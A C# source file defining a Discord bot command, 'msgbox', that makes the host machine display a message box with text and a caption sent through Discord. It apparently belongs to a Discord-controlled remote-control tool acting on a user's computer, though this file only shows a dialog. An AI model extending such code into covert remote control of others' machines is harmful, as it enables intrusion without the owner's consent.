using Discord;
using Discord.Commands;

namespace Main.Source.Bot.Commands
{
    public class Messagebox : CommandBase
    {
        public override string Name => "msgbox";
        public override string Info => "Opens a messagebox on the users screen";
        public override string Use => "=text + =caption?";

        public override async Task Func(SocketCommandContext socket, string[] args)
        {
            if (args.Length < 1)
            {
                await socket.Message.ReplyAsync("Usage: " + Use);
                return;
            }

            string arguments = string.Join(" ", args);

            string text = Utilities.Parser.ExactFromQuotes(arguments, "text");
            if (text == string.Empty)
            {
                await socket.Message.ReplyAsync("Usage: " + Use);
                return;
            }

            string caption = Utilities.Parser.ExactFromQuotes(arguments, "caption");

            await socket.Message.ReplyAsync($"Sent\nText: {text}\nCaption: {caption}");
            var res = MessageBox.Show(text, caption);
        }
    }
}
